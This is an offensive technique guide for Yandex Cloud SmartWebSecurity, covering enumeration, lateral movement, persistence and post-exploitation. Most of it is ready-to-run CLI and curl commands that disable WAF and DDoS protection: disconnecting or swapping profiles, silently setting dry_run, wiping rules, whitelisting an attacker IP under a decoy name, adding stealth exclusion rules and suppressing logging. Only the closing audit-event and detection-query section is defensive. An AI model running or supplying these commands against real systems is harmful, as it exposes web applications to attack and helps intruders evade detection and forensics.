# Yandex Cloud - SmartWebSecurity (WAF/DDoS Protection) Techniques

## Service Overview

SmartWebSecurity (SWS) is Yandex Cloud's Layer 7 web application firewall and DDoS protection service. It inspects HTTP requests at the Application Load Balancer (ALB) virtual host level, applying security rules to allow, deny, or CAPTCHA-challenge traffic. The service is the primary defense layer for web applications — compromising or disabling it exposes backends to direct attack.

**Architecture and Resource Hierarchy:**
- **Security Profile** — the core resource containing rules. Connected to ALB virtual hosts, SWS domains, or API Gateways. Has a `defaultAction` (ALLOW or DENY) and rules with priority 1-999999 (lower number = higher priority). The default rule at priority 1000000 applies the `defaultAction`
- **Rule Types**: Basic (allow/deny by conditions), Smart Protection (ML-based behavioral analysis), WAF (references a WAF profile), ARL (rate limiting, references an ARL profile)
- **WAF Profile** — separate resource with OWASP Core Rule Set (v4.0.0), Yandex Ruleset, and ML WAF. Each rule has anomaly score and paranoia level. Supports exclusion rules that can bypass ALL WAF checks
- **ARL Profile** — connected to a security profile, imposes rate limits with static quotas. Applied AFTER security profile rules pass
- **Domain Protection** — proxy server mode for protecting external (non-Yandex-Cloud) infrastructure. Requires TLS cert/key upload to Certificate Manager for HTTPS traffic decryption

**Critical Attack Insights:**
- The `dry_run` flag on any rule causes it to log but **never enforce** — silently disabling protection
- The `--security-rules-file` flag on CLI update **replaces all rules** — omitting rules effectively deletes them
- Disconnecting a security profile from a virtual host (`--security-profile-id ""`) removes all SWS protection instantly
- WAF exclusion rules with `excludeAll: true` and no conditions bypass ALL WAF checks for ALL traffic
- WAF and ARL profiles have **no CLI commands** — must be manipulated via REST API, Console, or Terraform

---

## Enumeration

### Enumerate Security Profiles

```bash
# List all security profiles in the default folder
yc smartwebsecurity security-profile list

# Get full details of a specific profile (rules, connected hosts, WAF/ARL profile IDs)
yc smartwebsecurity security-profile get <PROFILE-NAME|PROFILE-ID>

# Get profile as JSON for detailed analysis
yc smartwebsecurity security-profile get <PROFILE-NAME|PROFILE-ID> --format json

# Note: aliases also work
yc smart-web-security security-profile list
yc sws security-profile list
```

### Enumerate WAF Profiles via API

```bash
# List WAF profiles (no CLI command available)
curl -s -H "Authorization: Bearer $(yc iam create-token)" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/wafProfiles?folderId=<FOLDER-ID>"

# Get WAF profile details (rules, exclusions, anomaly thresholds)
curl -s -H "Authorization: Bearer $(yc iam create-token)" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/wafProfiles/<WAF-PROFILE-ID>"
```

### Enumerate ARL Profiles via API

```bash
# List ARL profiles (no CLI command available)
curl -s -H "Authorization: Bearer $(yc iam create-token)" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/advancedRateLimiterProfiles?folderId=<FOLDER-ID>"

# Get ARL profile details
curl -s -H "Authorization: Bearer $(yc iam create-token)" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/advancedRateLimiterProfiles/<ARL-PROFILE-ID>"
```

### Enumerate Connected Resources

```bash
# List HTTP routers to find virtual hosts with security profiles
yc application-load-balancer http-router list

# Get HTTP router details — look for security_profile_id in route_options
yc application-load-balancer http-router get <ROUTER-NAME|ROUTER-ID> --format json

# List virtual hosts for a specific router
yc application-load-balancer virtual-host list --http-router-name <ROUTER-NAME>
```

### Enumerate Domain Protection Resources

```bash
# List security profiles via API to find domain protection proxy servers
# Domain/proxy operations are Console-only, but profiles connected to domains
# are visible in the security profile list output
yc smartwebsecurity security-profile list --format json
```

---

## Lateral Movement

### Disconnect Security Profile from Virtual Host

With `alb.editor` (on the ALB side), completely remove SWS protection from a virtual host by setting an empty security profile ID. This is the fastest way to strip WAF/DDoS protection:

```bash
# Disconnect security profile — removes ALL SWS protection instantly
yc application-load-balancer virtual-host update <VHOST-NAME> \
  --http-router-name <ROUTER-NAME> \
  --security-profile-id ""
```

### Switch Default Action from DENY to ALLOW

With `smart-web-security.editor`, change the security profile's default action. If the default action is DENY (block all unmatched traffic), switching to ALLOW passes all traffic that does not match an explicit deny rule:

```bash
# Change default action to ALLOW — all unmatched traffic passes through
yc smartwebsecurity security-profile update <PROFILE-NAME> \
  --default-action ALLOW
```

### Enable Dry Run on All Rules

With `smart-web-security.editor`, enable dry run mode on all rules. In dry run mode, rules log matches but **never block traffic** — effectively disabling protection while appearing active:

```bash
# Create a rules file with all rules set to dry_run: true
# The --security-rules-file flag REPLACES all existing rules
cat > /tmp/rules-dryrun.yaml << 'EOF'
- name: smart-protection-rule
  priority: "1000"
  dry_run: true
  smart_protection:
    mode: FULL
- name: waf-rule
  priority: "2000"
  dry_run: true
  waf:
    mode: FULL
    waf_profile_id: "<WAF-PROFILE-ID>"
EOF

yc smartwebsecurity security-profile update <PROFILE-NAME> \
  --security-rules-file /tmp/rules-dryrun.yaml
```

### Delete All Rules by Providing Empty Rules File

The `--security-rules-file` flag **replaces** all existing rules. Providing an empty file deletes every rule, leaving only the default action:

```bash
# Empty rules file — removes ALL security rules
echo "[]" > /tmp/empty-rules.yaml
yc smartwebsecurity security-profile update <PROFILE-NAME> \
  --security-rules-file /tmp/empty-rules.yaml
```

### Whitelist Attacker IP via Rule Injection

Inject a high-priority ALLOW rule that whitelists attacker IPs, ensuring they bypass all subsequent deny rules and Smart Protection checks:

```bash
cat > /tmp/whitelist-rules.yaml << 'EOF'
- name: legitimate-monitoring
  description: "Infrastructure monitoring whitelist"
  priority: "1"
  rule_condition:
    action: ALLOW
    condition:
      source_ip:
        ip_ranges_match:
          ip_ranges:
            - <ATTACKER-IP>
EOF

# NOTE: This replaces all existing rules — first dump existing rules and prepend
yc smartwebsecurity security-profile update <PROFILE-NAME> \
  --security-rules-file /tmp/whitelist-rules.yaml
```

**Important**: Since `--security-rules-file` replaces all rules, the attacker should first export the current rules (`get --format json`), prepend the whitelist rule, and then update. Otherwise all existing rules are deleted, which is more visible.

### WAF Exclusion Rule — Bypass All WAF Checks

With `smart-web-security.editor`, add a WAF exclusion rule with `excludeAll: true` and no conditions. This bypasses ALL WAF rule sets for ALL traffic:

```bash
# Add universal WAF exclusion via API (no CLI for WAF profiles)
curl -X PATCH \
  -H "Authorization: Bearer $(yc iam create-token)" \
  -H "Content-Type: application/json" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/wafProfiles/<WAF-PROFILE-ID>" \
  -d '{
    "updateMask": "exclusionRules",
    "exclusionRules": [
      {
        "name": "tuning-false-positives",
        "excludeRules": {
          "excludeAll": true
        }
      }
    ]
  }'
```

### Raise WAF Anomaly Threshold to Maximum

Set the OWASP anomaly threshold to the maximum value (10000), ensuring no combination of triggered rules ever reaches the blocking threshold:

```bash
# Raise anomaly threshold to effectively disable blocking via API
curl -X PATCH \
  -H "Authorization: Bearer $(yc iam create-token)" \
  -H "Content-Type: application/json" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/wafProfiles/<WAF-PROFILE-ID>" \
  -d '{
    "updateMask": "coreRuleSet",
    "coreRuleSet": {
      "inboundAnomalyScore": 10000,
      "paranoiaLevel": 1,
      "ruleSet": {
        "name": "OWASP Core Ruleset",
        "version": "4.0.0"
      }
    }
  }'
```

### Disable Individual WAF Rules

Disable specific WAF rules (e.g., SQL injection detection) while keeping the profile nominally active:

```bash
# Disable specific rules via API update
curl -X PATCH \
  -H "Authorization: Bearer $(yc iam create-token)" \
  -H "Content-Type: application/json" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/wafProfiles/<WAF-PROFILE-ID>" \
  -d '{
    "updateMask": "rules",
    "rules": [
      {
        "ruleId": "<SQLI-RULE-ID>",
        "isEnabled": false,
        "isBlocking": false
      }
    ]
  }'
```

### Swap Security Profile on Virtual Host

Replace a legitimate security profile with a permissive attacker-controlled one. Requires both `smart-web-security.editor` (to create the profile) and `alb.editor` (to update the virtual host):

```bash
# Step 1: Create permissive profile (default ALLOW, no rules)
yc smartwebsecurity security-profile create attacker-profile \
  --default-action ALLOW

# Step 2: Connect it to the target virtual host
yc application-load-balancer virtual-host update <VHOST-NAME> \
  --http-router-name <ROUTER-NAME> \
  --security-profile-id <ATTACKER-PROFILE-ID>
```

### Cross-Service: API Gateway Integration

If the target uses API Gateway with SWS integration, remove the `x-yc-apigateway:smartWebSecurity` extension from the gateway specification to disable protection:

```bash
# Get API gateway spec
yc serverless api-gateway get <GATEWAY-NAME> --format json

# Update spec without the smartWebSecurity extension
yc serverless api-gateway update <GATEWAY-NAME> \
  --spec <MODIFIED-SPEC-FILE>
```

---

## Persistence

### Hidden Dry Run Backdoor

Enable dry run on specific critical rules while leaving others active. This creates a selective bypass that appears functional in dashboards but allows specific attack types through:

```bash
# Export current rules, set dry_run on WAF/Smart Protection rules only
yc smartwebsecurity security-profile get <PROFILE-NAME> --format json > /tmp/profile.json

# Modify the rules JSON to add dry_run: true on targeted rules
# Then update with the modified rules file
yc smartwebsecurity security-profile update <PROFILE-NAME> \
  --security-rules-file /tmp/modified-rules.yaml
```

### Stealth WAF Exclusion Rule

Add an exclusion rule scoped to a specific path (e.g., an API endpoint the attacker plans to exploit). Unlike a universal exclusion, this targets only the attacker's entry point:

```bash
# Add path-specific WAF exclusion via API
curl -X PATCH \
  -H "Authorization: Bearer $(yc iam create-token)" \
  -H "Content-Type: application/json" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/wafProfiles/<WAF-PROFILE-ID>" \
  -d '{
    "updateMask": "exclusionRules",
    "exclusionRules": [
      {
        "name": "api-health-check-tuning",
        "excludeRules": {
          "excludeAll": true
        },
        "condition": {
          "requestUri": {
            "path": {
              "prefixMatch": "/api/internal/"
            }
          }
        }
      }
    ]
  }'
```

### ARL Dry Run Persistence

Set ARL rules to dry run mode via API, allowing unlimited request rates. Rate limiting appears configured but never enforces:

```bash
# Update ARL profile to set dry_run on all quotas via API
curl -X PATCH \
  -H "Authorization: Bearer $(yc iam create-token)" \
  -H "Content-Type: application/json" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/advancedRateLimiterProfiles/<ARL-PROFILE-ID>" \
  -d '{
    "updateMask": "advancedRateLimiterRules",
    "advancedRateLimiterRules": [
      {
        "name": "rate-limit-all",
        "dryRun": true,
        "staticQuota": {
          "action": "DENY",
          "limit": "100",
          "period": "60s"
        }
      }
    ]
  }'
```

### Logging Suppression

Disable or reduce logging on the security profile to hide evidence of rule modifications and bypass events:

```bash
# Via Console: Edit security profile → disable logging
# Via API: Update security profile to disable or reduce logging coverage
# Reduce ALLOW verdict logging percentage to 1% to minimize forensic data
# Disable logging for specific rule types (WAF, ARL) selectively
```

---

## Post-Exploitation

### Delete Security Profile

```bash
# Delete the security profile entirely — disconnects from all virtual hosts
yc smartwebsecurity security-profile delete <PROFILE-NAME|PROFILE-ID>
```

### Delete WAF Profile

```bash
# Delete WAF profile via API (requires removing WAF rules from security profiles first)
curl -X DELETE \
  -H "Authorization: Bearer $(yc iam create-token)" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/wafProfiles/<WAF-PROFILE-ID>"
```

### Delete ARL Profile

```bash
# Delete ARL profile via API
curl -X DELETE \
  -H "Authorization: Bearer $(yc iam create-token)" \
  "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/advancedRateLimiterProfiles/<ARL-PROFILE-ID>"
```

### Domain Protection Disruption

For applications using SWS domain protection (external proxy mode), deleting the domain or proxy server removes all protection:

```bash
# Domain and proxy server deletion is Console-only
# The proxy server provides the public IP that DNS A records point to
# Deleting it breaks traffic flow entirely — both protection and availability
```

### Expose Origin Server IP

In domain protection mode, the proxy server hides the origin IP. If the attacker discovers the origin IP through other means (DNS history, certificate transparency logs, information disclosure), they can bypass SWS entirely by connecting directly to the origin.

---

## Key IAM Roles

### SmartWebSecurity Roles

| Role | Capabilities |
|---|---|
| `smart-web-security.auditor` | View security profiles and metadata only |
| `smart-web-security.viewer` | View profiles, permissions, and connected hosts. Includes auditor |
| `smart-web-security.user` | View + use profiles from other services (required to connect profile to ALB virtual host). Includes viewer |
| `smart-web-security.editor` | Create/modify/delete security profiles, WAF profiles, ARL profiles. **Primary attack role** for disabling protection. Includes user |
| `smart-web-security.admin` | Editor + manage access bindings (IAM policy). Can grant SWS roles to other principals |

### Cross-Service Roles Required for Full Attack Chain

| Role | Why Needed |
|---|---|
| `alb.editor` | Connect/disconnect security profiles to/from ALB virtual hosts |
| `certificate-manager.certificates.downloader` | Download TLS private keys from Certificate Manager (domain protection certificates) |
| `smart-web-security.editor` | Modify security profiles, WAF profiles, ARL profiles |
| `smart-web-security.user` | Reference security profiles when updating ALB virtual hosts |

### Role Hierarchy

Roles can be assigned at organization, cloud, or folder level. The hierarchy is:
`auditor` -> `viewer` -> `user` -> `editor` -> `admin`

Each role includes all permissions of lower roles.

---

## Detection and Logging

### Audit Trail Events

**Control Plane Events** (source: `smartwebsecurity`):

| Event | Security Relevance |
|---|---|
| `CreateSecurityProfile` | New profile creation |
| `UpdateSecurityProfile` | **HIGH** — rule manipulation, dry_run enablement, default action change |
| `DeleteSecurityProfile` | **HIGH** — protection removal |
| `CreateWafProfile` | New WAF profile |
| `UpdateWafProfile` | **HIGH** — exclusion rule injection, anomaly threshold manipulation, rule disablement |
| `DeleteWafProfile` | **HIGH** — WAF removal |
| `CreateArlProfile` | New ARL profile |
| `UpdateArlProfile` | **HIGH** — rate limit manipulation, dry_run enablement |
| `DeleteArlProfile` | **HIGH** — rate limiting removal |
| `CreateDomain` | Domain added to proxy protection |
| `UpdateDomain` | Domain configuration change |
| `DeleteDomain` | **HIGH** — domain protection removal |
| `CreateLoadBalancer` | Proxy server creation |
| `UpdateLoadBalancer` | Proxy server change |
| `DeleteLoadBalancer` | **HIGH** — proxy server removal |
| `CreateMatchList` | IP list creation |
| `UpdateMatchList` | IP list modification (could add attacker IPs to whitelist) |
| `DeleteMatchList` | IP list removal |

**Data Plane Events** (must be explicitly enabled in security profile logging settings):

| Event | Security Relevance |
|---|---|
| `SWSMatchedRequest` | Security profile rule triggered for a request |
| `WafMatchedRule` | WAF rule triggered for a request |
| `WafMatchedExclusionRule` | WAF exclusion rule triggered — indicates bypassed checks |
| `ArlMatchedRequest` | ARL rate limit rule triggered |

### Key Detection Gaps

- **Data plane events require explicit enablement**: Both Cloud Logging and Audit Trails data events must be configured per security profile — they are NOT enabled by default
- **Dry run changes are silent**: Enabling dry_run on rules appears as a normal `UpdateSecurityProfile` event with no special indicator; defenders must inspect the event details to notice dry_run changes
- **WAF profile changes via API only**: No CLI audit trail for WAF/ARL profile modifications — only API calls logged in Audit Trails
- **ALB virtual host changes are logged under `apploadbalancer` source, not `smartwebsecurity`**: Disconnecting a security profile from a virtual host generates `UpdateVirtualHost` in the ALB audit trail, not SWS
- **ALLOW verdict logging is percentage-based**: Legitimate request logs can be set to 1-100% sampling, meaning evidence may be incomplete
- **No alerting on protection gaps**: There is no built-in alert when a virtual host loses its security profile or when all rules become dry_run

### Detection Queries

**Detect security profile modification or deletion**:
```
event_type = "yandex.cloud.audit.smartwebsecurity.UpdateSecurityProfile" OR
event_type = "yandex.cloud.audit.smartwebsecurity.DeleteSecurityProfile"
```

**Detect WAF profile weakening**:
```
event_type = "yandex.cloud.audit.smartwebsecurity.UpdateWafProfile" OR
event_type = "yandex.cloud.audit.smartwebsecurity.DeleteWafProfile"
```

**Detect ARL profile changes**:
```
event_type = "yandex.cloud.audit.smartwebsecurity.UpdateArlProfile" OR
event_type = "yandex.cloud.audit.smartwebsecurity.DeleteArlProfile"
```

**Detect security profile disconnection from ALB virtual host** (in ALB audit trail):
```
event_type LIKE "%UpdateVirtualHost%"
```
Look for changes where `security_profile_id` is removed or changed.

**Detect WAF exclusion rule bypasses in data plane logs**:
```
module_type = "WAF", meta.waf_matched_exclusion_rules != ""
```

**Detect dry run activity in SWS logs**:
```
meta.dry_run_matched_rule_verdict = "DENY" OR
meta.dry_run_matched_rule_verdict = "CAPTCHA"
```
High volume of dry_run denials with zero actual denials indicates protection has been silently disabled.

---

## References

- SmartWebSecurity Overview: `en/smartwebsecurity/concepts/index.md`
- Security Profiles: `en/smartwebsecurity/concepts/profiles.md`
- Rules: `en/smartwebsecurity/concepts/rules.md`
- WAF Profiles: `en/smartwebsecurity/concepts/waf.md`
- Advanced Rate Limiter: `en/smartwebsecurity/concepts/arl.md`
- Domain Protection: `en/smartwebsecurity/concepts/domain-protect.md`
- Conditions: `en/smartwebsecurity/concepts/conditions.md`
- Logging: `en/smartwebsecurity/concepts/logging.md`
- Access Management: `en/smartwebsecurity/security/index.md`
- Audit Trail Events: `en/smartwebsecurity/at-ref.md`
- CLI Reference: `en/smartwebsecurity/cli-ref/`
- Security Profile CLI Create: `en/smartwebsecurity/cli-ref/security-profile/create.md`
- Security Profile CLI Update: `en/smartwebsecurity/cli-ref/security-profile/update.md`
- Connect Profile to Host: `en/smartwebsecurity/operations/host-connect.md`
- Disconnect Profile from Host: `en/smartwebsecurity/operations/host-delete.md`
- WAF Exclusion Rules: `en/smartwebsecurity/operations/exclusion-rule-add.md`
- Configure WAF Rules: `en/smartwebsecurity/operations/configure-set-rules.md`
- Configure Logging: `en/smartwebsecurity/operations/configure-logging.md`
- SecurityProfile REST API: `en/smartwebsecurity/api-ref/SecurityProfile/`
- WafProfile REST API: `en/smartwebsecurity/waf/api-ref/WafProfile/`
- API Gateway SWS Extension: `en/api-gateway/concepts/extensions/sws.md`
